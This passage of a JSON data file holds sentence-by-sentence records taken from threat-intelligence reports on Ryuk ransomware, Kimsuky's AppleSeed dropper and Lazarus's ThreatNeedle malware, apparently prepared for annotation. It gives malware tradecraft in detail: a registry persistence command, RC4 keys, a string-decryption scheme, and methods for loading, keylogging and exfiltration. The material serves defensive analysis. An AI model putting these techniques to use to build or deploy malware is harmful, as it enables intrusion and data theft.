        "line": 43,
        "index": 1844
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S44",
        "text": "They accessed the GPO\u2019s for the domain but none were modified or added.\n",
        "type": "",
        "report": "r-740",
        "line": 44,
        "index": 1845
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S45",
        "text": "Shortly there after we saw a Cobalt Strike DLL transferred via the RDP connection.\n",
        "type": "",
        "report": "r-740",
        "line": 45,
        "index": 1846
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S46",
        "text": "RDP was used to pivot from the main domain controller and distribute the final ransomware payload enterprise wide.\n",
        "type": "",
        "report": "r-740",
        "line": 46,
        "index": 1847
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S47",
        "text": "After our previous report, @kyleehmke pivoted off of our prior Ryuk report and used the network data to link several of these domains which we saw in this case.",
        "type": "",
        "report": "r-740",
        "line": 47,
        "index": 1848
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S48",
        "text": "Starting around 4.5 hours after the initial Bazar malware was executed, the Ryuk threat actors acted on their final objectives and initiated RDP connections from the domain controller previously exploited, to the rest of the environment.",
        "type": "",
        "report": "r-740",
        "line": 48,
        "index": 1849
    },
    {
        "id": "cti_reports_filtered/r-740.md:::S49",
        "text": "This time they initiated the ransomware first on the secondary domain controller (their 1st pivot) and transferred the Ryuk executable over the RDP connection.\n",
        "type": "",
        "report": "r-740",
        "line": 49,
        "index": 1850
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S0",
        "text": "The actor has distributed its dropper embedded in an archive file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.zip) as an attachment through spearphishing emails.",
        "type": "",
        "report": "r-742",
        "line": 0,
        "index": 1851
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S1",
        "text": "The target email addresses have been collected using the actor email phishing campaigns we described in the previous section.",
        "type": "",
        "report": "r-742",
        "line": 1,
        "index": 1852
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S2",
        "text": "The actor conducted this spearphishing attack on May 7, 2021.",
        "type": "",
        "report": "r-742",
        "line": 2,
        "index": 1853
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S3",
        "text": "The archive file contains a JavaScript file (\uc678\uad50\ubd80 \uac00\ud310 2021-05-07.pdf.jse) which pretends to be a PDF file that contains two Base64 encoded blobs.",
        "type": "",
        "report": "r-742",
        "line": 3,
        "index": 1854
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S4",
        "text": "The first one is the content of the decoy PDF file in Base64 format and the other one contains the AppleSeed payload also in Base64 format (encoded twice).\n",
        "type": "",
        "report": "r-742",
        "line": 4,
        "index": 1855
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S5",
        "text": "At first it uses the MSXML Base64 decoding functionality to decode the first layer and then uses certutil.exe to decode the second layer and get the final ApppleSeed payload.",
        "type": "",
        "report": "r-742",
        "line": 5,
        "index": 1856
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S6",
        "text": "The decoy PDF file has been decoded using the MSXML Base64 decoding function.",
        "type": "",
        "report": "r-742",
        "line": 6,
        "index": 1857
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S7",
        "text": "After decoding the PDF and AppleSeed payload, the content gets written into the ProgramData directory.",
        "type": "",
        "report": "r-742",
        "line": 7,
        "index": 1858
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S8",
        "text": "At the end, the decoy PDF file is opened by calling Wscript.Shell.Run and the AppleSeed payload executed through PowerShell by calling regsvr32.exe.",
        "type": "",
        "report": "r-742",
        "line": 8,
        "index": 1859
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S9",
        "text": "Calling regsvr32.exe to run a DLL registers it as a server that automatically calls the DLL export function that has been named DllRegisterServer.\n",
        "type": "",
        "report": "r-742",
        "line": 9,
        "index": 1860
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S10",
        "text": "The dropped payload is a DLL file that has been packed using the UPX packer.",
        "type": "",
        "report": "r-742",
        "line": 10,
        "index": 1861
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S11",
        "text": "The unpacked sample is highly obfuscated and important API calls and strings have been encrypted using a custom encryption algorithm.",
        "type": "",
        "report": "r-742",
        "line": 11,
        "index": 1862
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S12",
        "text": "The encrypted version of the strings and API calls are in hex ASCII format.",
        "type": "",
        "report": "r-742",
        "line": 12,
        "index": 1863
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S13",
        "text": "Whenever in the code the malware needs to use a string, it takes the encrypted string and passes it into two functions to decrypt it.\n",
        "type": "",
        "report": "r-742",
        "line": 13,
        "index": 1864
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S14",
        "text": "The first function \"string_decryptor_prep\" gets the encrypted string and then prepares a custom data structure that has four elements:\n",
        "type": "",
        "report": "r-742",
        "line": 14,
        "index": 1865
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S15",
        "text": "The second function \"string_decryptor\" gets the created data structure in the previous function and then decrypts the string and puts it in the same data structure.\n",
        "type": "",
        "report": "r-742",
        "line": 15,
        "index": 1866
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S16",
        "text": "The decryptor function first convert the input string in hex ascii format to binary by calling the hexascii_to_binary function on each two ascii characters (i.e. c3, 42, b1, 1d... in example 1).",
        "type": "",
        "report": "r-742",
        "line": 16,
        "index": 1867
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S17",
        "text": "The first 16 bytes of in the input is then used as the key and the remainder is the actual value that gets decrypted in 16 byte chunks (i.e. ed, d5, 0d, 60).",
        "type": "",
        "report": "r-742",
        "line": 17,
        "index": 1868
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S18",
        "text": "Decryption is a simple xor operation of key[i] ^ string[i-1] ^ string[i] (For the first character string_to_be_decrypted[i-1] is set to zero).",
        "type": "",
        "report": "r-742",
        "line": 18,
        "index": 1869
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S19",
        "text": "Most of the important API calls resolve dynamically during the run time using \"string_decryptor\" function.",
        "type": "",
        "report": "r-742",
        "line": 19,
        "index": 1870
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S20",
        "text": "(288 API calls have been resolved dynamically.)",
        "type": "",
        "report": "r-742",
        "line": 20,
        "index": 1871
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S21",
        "text": "The AppleSeed payload has an export function named \"DllRegisterServer\" which will be called when the DLL is executed using RegSvr32.exe.",
        "type": "",
        "report": "r-742",
        "line": 21,
        "index": 1872
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S22",
        "text": "DllRegisterServer has a function that is responsible for performing the DLL initialization and setup that includes the following steps:\n",
        "type": "",
        "report": "r-742",
        "line": 22,
        "index": 1873
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S23",
        "text": "Copy itself into \"C:\\ProgramData\\Software\\ESTsoft\\Common\" and rename itself as ESTCommon.dll to pretend it is a DLL that belongs to ESTsecurity company.\n",
        "type": "",
        "report": "r-742",
        "line": 23,
        "index": 1874
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S24",
        "text": "and rename itself as to pretend it is a DLL that belongs to ESTsecurity company.",
        "type": "",
        "report": "r-742",
        "line": 24,
        "index": 1875
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S25",
        "text": "Make itself persistent by creating the following registry key:\n",
        "type": "",
        "report": "r-742",
        "line": 25,
        "index": 1876
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S26",
        "text": "Registry key name: EstsoftAutoUpdate Registry key value: Regsvr32.exe /s C:\\ProgramData\\Software\\ESTsoft\\Common\\ESTCommon.dll Registry location: HKLU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n",
        "type": "",
        "report": "r-742",
        "line": 26,
        "index": 1877
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S27",
        "text": "Functionality activation by creating the following files into \"C:\\ProgramData\\Software\\ESTsoft\\Common\\flags\" directory and writes \"flag\" into them: FolderMonitor, KeyboardMonitor, ScreenMonitor, UsbMonitor.\n",
        "type": "",
        "report": "r-742",
        "line": 27,
        "index": 1878
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S28",
        "text": "In the next step it creates a Mutex to make sure it only infects a victim once.\n",
        "type": "",
        "report": "r-742",
        "line": 28,
        "index": 1879
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S29",
        "text": "After creating that mutex, it checks if the current process has the right access privilege by calling GetTokenInformation API call and if it does not have the right privilege, it tries to escalate its privilege using AdjustTokenPrivilege by passing SeDebugPrivilege to it to gain system level privilege.\n",
        "type": "",
        "report": "r-742",
        "line": 29,
        "index": 1880
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S30",
        "text": "At the end it performs its main functionalities in separate threads.",
        "type": "",
        "report": "r-742",
        "line": 30,
        "index": 1881
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S31",
        "text": "All the the collected data in each thread is being zipped and encrypted and is being sent to the command and control server using HTTP POST requests in a separate thread.",
        "type": "",
        "report": "r-742",
        "line": 31,
        "index": 1882
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S32",
        "text": "After sending the data to the server, the data is deleted from the victim's machine.\n",
        "type": "",
        "report": "r-742",
        "line": 32,
        "index": 1883
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S33",
        "text": "The ApppleSeed payload is using RC4 for encryption and decryption of the data.",
        "type": "",
        "report": "r-742",
        "line": 33,
        "index": 1884
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S34",
        "text": "To generate RC4 key, it creates a Random buffer of 117 bytes by Calling CryptGenRandom and then uses CryptCreateHash and CryptHashData to adds the buffer into a MD5 hash object.",
        "type": "",
        "report": "r-742",
        "line": 34,
        "index": 1885
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S35",
        "text": "Then it calls CryptDeriveKey to generate the RC4 key.",
        "type": "",
        "report": "r-742",
        "line": 35,
        "index": 1886
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S36",
        "text": "The created 117 bytes buffer is encrypted using RSA algorithm and is sent to the sever along with RC4 encrypted data.",
        "type": "",
        "report": "r-742",
        "line": 36,
        "index": 1887
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S37",
        "text": "The RSA key is in hex ASCII format and has been decrypted using \"string_decryptor\" function.\n",
        "type": "",
        "report": "r-742",
        "line": 37,
        "index": 1888
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S38",
        "text": "The keylogger function uses GetKeyState and GetKeyboardState to capture the pressed keys on the victim's machine and logs all keys per process into the log.txt file.\n",
        "type": "",
        "report": "r-742",
        "line": 38,
        "index": 1889
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S39",
        "text": "This module takes screenshots by calling the following sequence of API calls and writes them to files: GetDesktopWindow, GetDC, CreateCompstibleDC, CreateCompatibleBitmap, Bitblt and GetDIBits and then writes them into a file using CreateFileW and WriteFile.\n",
        "type": "",
        "report": "r-742",
        "line": 39,
        "index": 1890
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S40",
        "text": "This module finds the removable media devices connected to the machine and collects its data before sending it to the command and control server.",
        "type": "",
        "report": "r-742",
        "line": 40,
        "index": 1891
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S41",
        "text": "To identify a USB drive it calls CM_Get_Device_IDW to retrieve the device instance ID that would be in format \" <device-ID>\\<instance-specific-ID> \" and then checks if it contains USB string value.\n",
        "type": "",
        "report": "r-742",
        "line": 41,
        "index": 1892
    },
    {
        "id": "cti_reports_filtered/r-742.md:::S42",
        "text": "This thread looks for txt, ppt, hwp, pdf, and doc files in the Desktop, Documents, Downloads and AppData\\Local\\Microsoft\\Windows\\INetCache\\IE directories and archives them to be ready to be exfiltrated to the server.",
        "type": "",
        "report": "r-742",
        "line": 42,
        "index": 1893
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S0",
        "text": "In this attack, spear phishing was used as the initial infection vector.",
        "type": "",
        "report": "r-773",
        "line": 0,
        "index": 1894
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S1",
        "text": "Before launching the attack, the group studied publicly available information about the targeted organization and identified email addresses belonging to various departments of the company.\n",
        "type": "",
        "report": "r-773",
        "line": 1,
        "index": 1895
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S2",
        "text": "Email addresses in those departments received phishing emails that either had a malicious Word document attached or a link to one hosted on a remote server.",
        "type": "",
        "report": "r-773",
        "line": 2,
        "index": 1896
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S3",
        "text": "The phishing emails claimed to have urgent updates on today\u2019s hottest topic \u2013 COVID-19 infections.",
        "type": "",
        "report": "r-773",
        "line": 3,
        "index": 1897
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S4",
        "text": "The phishing emails were carefully crafted and written on behalf of a medical center that is part of the organization under attack.",
        "type": "",
        "report": "r-773",
        "line": 4,
        "index": 1898
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S5",
        "text": "The attackers registered accounts with a public email service, making sure the sender\u2019s email addresses looked similar to the medical center\u2019s real email address.",
        "type": "",
        "report": "r-773",
        "line": 5,
        "index": 1899
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S6",
        "text": "The signature shown in the phishing emails included the actual personal data of the deputy head doctor of the attacked organization\u2019s medical center.",
        "type": "",
        "report": "r-773",
        "line": 6,
        "index": 1900
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S7",
        "text": "The attackers were able to find this information on the medical center\u2019s public website.",
        "type": "",
        "report": "r-773",
        "line": 7,
        "index": 1901
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S8",
        "text": "A macro in the Microsoft Word document contained the malicious code designed to download and execute additional malicious software on the infected system.",
        "type": "",
        "report": "r-773",
        "line": 8,
        "index": 1902
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S9",
        "text": "The document contains information on the population health assessment program and is not directly related to the subject of the phishing email (COVID-19), suggesting the attackers may not completely understand the meaning of the contents they used.",
        "type": "",
        "report": "r-773",
        "line": 9,
        "index": 1903
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S10",
        "text": "The content of the lure document was copied from an online post by a health clinic.\n",
        "type": "",
        "report": "r-773",
        "line": 10,
        "index": 1904
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S11",
        "text": "Our investigation showed that the initial spear-phishing attempt was unsuccessful due to macros being disabled in the Microsoft Office installation of the targeted systems.",
        "type": "",
        "report": "r-773",
        "line": 11,
        "index": 1905
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S12",
        "text": "In order to persuade the target to allow the malicious macro, the attacker sent another email showing how to enable macros in Microsoft Office.\n",
        "type": "",
        "report": "r-773",
        "line": 12,
        "index": 1906
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S13",
        "text": "After sending the above email with explanations, the attackers realized that the target was using a different version of Microsoft Office and therefore required a different procedure for enabling macros.",
        "type": "",
        "report": "r-773",
        "line": 13,
        "index": 1907
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S14",
        "text": "The attackers subsequently sent another email showing the correct procedure in a screenshot with a Russian language pack.\n",
        "type": "",
        "report": "r-773",
        "line": 14,
        "index": 1908
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S15",
        "text": "The content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020, did not contain any grammatical mistakes.",
        "type": "",
        "report": "r-773",
        "line": 15,
        "index": 1909
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S16",
        "text": "However, in subsequent emails the attackers made numerous errors, suggesting they may not be native Russian speakers and were using translation tools.",
        "type": "",
        "report": "r-773",
        "line": 16,
        "index": 1910
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S17",
        "text": "On June 3, 2020, one of the malicious attachments was opened by employees and at 9:30 am local time the attackers gained remote control of the infected system.\n",
        "type": "",
        "report": "r-773",
        "line": 17,
        "index": 1911
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S18",
        "text": "This group also utilized different types of spear-phishing attack.",
        "type": "",
        "report": "r-773",
        "line": 18,
        "index": 1912
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S19",
        "text": "One of the compromised hosts received several spear-phishing documents on May 19, 2020.",
        "type": "",
        "report": "r-773",
        "line": 19,
        "index": 1913
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S20",
        "text": "The malicious file that was delivered, named Boeing_AERO_GS.docx, fetches a template from a remote server.",
        "type": "",
        "report": "r-773",
        "line": 20,
        "index": 1914
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S21",
        "text": "However, no payload created by this malicious document could be discovered.",
        "type": "",
        "report": "r-773",
        "line": 21,
        "index": 1915
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S22",
        "text": "We speculate that the infection from this malicious document failed for a reason unknown to us.",
        "type": "",
        "report": "r-773",
        "line": 22,
        "index": 1916
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S23",
        "text": "A few days later, the same host opened a different malicious document.",
        "type": "",
        "report": "r-773",
        "line": 23,
        "index": 1917
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S24",
        "text": "The threat actor wiped these files from disk after the initial infection meaning they could not be obtained.\n",
        "type": "",
        "report": "r-773",
        "line": 24,
        "index": 1918
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S25",
        "text": "Nonetheless, a related malicious document with this malware was retrieved based on our telemetry.",
        "type": "",
        "report": "r-773",
        "line": 25,
        "index": 1919
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S26",
        "text": "It creates a payload and shortcut file and then continues executing the payload by using the following command line parameters.\n",
        "type": "",
        "report": "r-773",
        "line": 26,
        "index": 1920
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S27",
        "text": "- Payload path: %APPDATA%\\Microsoft\\Windows\\lconcaches.db\n",
        "type": "",
        "report": "r-773",
        "line": 27,
        "index": 1921
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S28",
        "text": "- Shortcut path: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk\n",
        "type": "",
        "report": "r-773",
        "line": 28,
        "index": 1922
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S29",
        "text": "- Command Line; please note that the string at the end is hard-coded, but different for each sample:\n",
        "type": "",
        "report": "r-773",
        "line": 29,
        "index": 1923
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S30",
        "text": "- exe [dllpath],Dispatch n2UmQ9McxUds2b29\n",
        "type": "",
        "report": "r-773",
        "line": 30,
        "index": 1924
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S31",
        "text": "The content of the decoy document depicts the job description of a generator/power industry engineer.",
        "type": "",
        "report": "r-773",
        "line": 31,
        "index": 1925
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S32",
        "text": "Upon opening a malicious document and allowing the macro, the malware is dropped and proceeds to a multistage deployment procedure.",
        "type": "",
        "report": "r-773",
        "line": 32,
        "index": 1926
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S33",
        "text": "The malware used in this campaign belongs to a known malware cluster we named ThreatNeedle.",
        "type": "",
        "report": "r-773",
        "line": 33,
        "index": 1927
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S34",
        "text": "We attribute this malware family to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group.",
        "type": "",
        "report": "r-773",
        "line": 34,
        "index": 1928
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S35",
        "text": "We previously observed the Lazarus group utilizing this cluster when attacking cryptocurrency businesses and a mobile game company.",
        "type": "",
        "report": "r-773",
        "line": 35,
        "index": 1929
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S36",
        "text": "Although the malware involved and the entire infection process is known and has not changed dramatically compared to previous findings, the Lazarus group continued using ThreatNeedle malware aggressively in this campaign.",
        "type": "",
        "report": "r-773",
        "line": 36,
        "index": 1930
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S37",
        "text": "The payload created by the initial spear-phishing document loads the next stage as a backdoor running in-memory \u2013 the ThreatNeedle backdoor.",
        "type": "",
        "report": "r-773",
        "line": 37,
        "index": 1931
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S38",
        "text": "ThreatNeedle offers functionality to control infected victims.",
        "type": "",
        "report": "r-773",
        "line": 38,
        "index": 1932
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S39",
        "text": "The actor uses it to carry out initial reconnaissance and deploy additional malware for lateral movement.",
        "type": "",
        "report": "r-773",
        "line": 39,
        "index": 1933
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S40",
        "text": "When moving laterally, the actor uses ThreatNeedle installer-type malware in the process.",
        "type": "",
        "report": "r-773",
        "line": 40,
        "index": 1934
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S41",
        "text": "This installer is responsible for implanting the next stage loader-type malware and registering it for auto-execution in order to achieve persistence.",
        "type": "",
        "report": "r-773",
        "line": 41,
        "index": 1935
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S42",
        "text": "The ThreatNeedle loader-type malware exists in several variations and serves the primary purpose of loading the final stage of the ThreatNeedle malware in-memory.",
        "type": "",
        "report": "r-773",
        "line": 42,
        "index": 1936
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S43",
        "text": "Upon launch, the malware decrypts an embedded string using RC4 (key: B6 B7 2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to \u201c7486513879852\u201c.",
        "type": "",
        "report": "r-773",
        "line": 43,
        "index": 1937
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S44",
        "text": "If the user executes this malware without a command line parameter, the malware launches a legitimate calculator carrying a dark icon of the popular Avengers franchise.",
        "type": "",
        "report": "r-773",
        "line": 44,
        "index": 1938
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S45",
        "text": "Further into the infection process, the malware chooses a service name randomly from netsvc in order to use it for the payload creation path.",
        "type": "",
        "report": "r-773",
        "line": 45,
        "index": 1939
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S46",
        "text": "The malware then creates a file named bcdbootinfo.tlp in the system folder containing the infection time and the random service name that is chosen.",
        "type": "",
        "report": "r-773",
        "line": 46,
        "index": 1940
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S47",
        "text": "We\u2019ve discovered that the malware operator checks this file to see whether the remote host was infected and, if so, when the infection happened.",
        "type": "",
        "report": "r-773",
        "line": 47,
        "index": 1941
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S48",
        "text": "It then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml extension with a randomly created five-character file name in the current directory and then copies it to the system folder with a .sys extension.",
        "type": "",
        "report": "r-773",
        "line": 48,
        "index": 1942
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S49",
        "text": "This final payload is the ThreatNeedle loader running in memory.",
        "type": "",
        "report": "r-773",
        "line": 49,
        "index": 1943
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S50",
        "text": "At this point the loader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the dropped malware is registered as a Windows service and launched.",
        "type": "",
        "report": "r-773",
        "line": 50,
        "index": 1944
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S51",
        "text": "In addition, the malware saves the configuration data as a registry key encrypted in RC4:\n",
        "type": "",
        "report": "r-773",
        "line": 51,
        "index": 1945
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S52",
        "text": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameConfig \u2013 Description\n",
        "type": "",
        "report": "r-773",
        "line": 52,
        "index": 1946
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S53",
        "text": "This component is responsible for loading the final backdoor payload into memory.",
        "type": "",
        "report": "r-773",
        "line": 53,
        "index": 1947
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S54",
        "text": "In order to do this, the malware uses several techniques to decrypt its payload:\n",
        "type": "",
        "report": "r-773",
        "line": 54,
        "index": 1948
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S55",
        "text": "- Loading the payload from the registry.\n",
        "type": "",
        "report": "r-773",
        "line": 55,
        "index": 1949
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S56",
        "text": "- Loading the payload from itself after decrypting RC4 and decompression.\n",
        "type": "",
        "report": "r-773",
        "line": 56,
        "index": 1950
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S57",
        "text": "- Loading the payload from itself after decrypting AES and decompression.\n",
        "type": "",
        "report": "r-773",
        "line": 57,
        "index": 1951
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S58",
        "text": "- Loading the payload from itself after decompression.\n",
        "type": "",
        "report": "r-773",
        "line": 58,
        "index": 1952
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S59",
        "text": "- Loading the payload from itself after one-byte XORing.\n",
        "type": "",
        "report": "r-773",
        "line": 59,
        "index": 1953
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S60",
        "text": "Most loader-style malware types check the command line parameter and only proceed with the malicious routine if an expected parameter is given.",
        "type": "",
        "report": "r-773",
        "line": 60,
        "index": 1954
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S61",
        "text": "This is a common trait in ThreatNeedle loaders.",
        "type": "",
        "report": "r-773",
        "line": 61,
        "index": 1955
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S62",
        "text": "The most common example we\u2019ve seen is similar to the ThreatNeedle installer \u2013 the malware decrypts an embedded string using RC4, and compares it with the parameter \u201cSx6BrUk4v4rqBFBV\u201d upon launch.",
        "type": "",
        "report": "r-773",
        "line": 62,
        "index": 1956
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S63",
        "text": "If it matches, the malware begins decrypting its embedded payload using the same RC4 key.",
        "type": "",
        "report": "r-773",
        "line": 63,
        "index": 1957
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S64",
        "text": "The decrypted payload is an archive file which is subsequently decompressed in the process.",
        "type": "",
        "report": "r-773",
        "line": 64,
        "index": 1958
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S65",
        "text": "Eventually, the ThreatNeedle malware spawns in memory.",
        "type": "",
        "report": "r-773",
        "line": 65,
        "index": 1959
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S66",
        "text": "The other variant of the loader is preparing the next stage payload from the victim\u2019s registry.",
        "type": "",
        "report": "r-773",
        "line": 66,
        "index": 1960
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S67",
        "text": "As we can see from the installer malware description, we suspect that the registry key was created by the installer component.",
        "type": "",
        "report": "r-773",
        "line": 67,
        "index": 1961
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S68",
        "text": "Retrieved data from the registry is decrypted using RC4 and then decompressed.",
        "type": "",
        "report": "r-773",
        "line": 68,
        "index": 1962
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S69",
        "text": "Eventually, it gets loaded into memory and the export function is invoked.\n",
        "type": "",
        "report": "r-773",
        "line": 69,
        "index": 1963
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S70",
        "text": "The final payload executed in memory is the actual ThreatNeedle backdoor.",
        "type": "",
        "report": "r-773",
        "line": 70,
        "index": 1964
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S71",
        "text": "It has the following functionality to control infected victim machines:\n",
        "type": "",
        "report": "r-773",
        "line": 71,
        "index": 1965
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S72",
        "text": "- Manipulate files/directories\n",
        "type": "",
        "report": "r-773",
        "line": 72,
        "index": 1966
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S73",
        "text": "- System profiling\n",
        "type": "",
        "report": "r-773",
        "line": 73,
        "index": 1967
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S74",
        "text": "- Control backdoor processes\n",
        "type": "",
        "report": "r-773",
        "line": 74,
        "index": 1968
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S75",
        "text": "- Enter sleeping or hibernation mode\n",
        "type": "",
        "report": "r-773",
        "line": 75,
        "index": 1969
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S76",
        "text": "- Update backdoor configuration\n",
        "type": "",
        "report": "r-773",
        "line": 76,
        "index": 1970
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S77",
        "text": "- Execute received commands\n",
        "type": "",
        "report": "r-773",
        "line": 77,
        "index": 1971
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S78",
        "text": "From one of the hosts, we discovered that the actor executed a credential harvesting tool named Responder and moved laterally using Windows commands.",
        "type": "",
        "report": "r-773",
        "line": 78,
        "index": 1972
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S79",
        "text": "Lazarus overcame network segmentation, exfiltrating data from a completely isolated network segment cut off from the internet by compromising a router virtual machine, as we explain below under \u201cOvercoming network segmentation\u201c.\n",
        "type": "",
        "report": "r-773",
        "line": 79,
        "index": 1973
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S80",
        "text": "Judging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation, we speculate that the primary intention of this attack is to steal intellectual property.",
        "type": "",
        "report": "r-773",
        "line": 80,
        "index": 1974
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S81",
        "text": "Lastly, the stolen data gets exfiltrated using a custom tool that will be described in the \u201cExfiltration\u201d section.",
        "type": "",
        "report": "r-773",
        "line": 81,
        "index": 1975
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S82",
        "text": "Below is a rough timeline of the compromise we investigated:\n",
        "type": "",
        "report": "r-773",
        "line": 82,
        "index": 1976
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S83",
        "text": "During the investigation we discovered that the Responder tool was executed from one of the victim machines that had received the spear-phishing document.",
        "type": "",
        "report": "r-773",
        "line": 83,
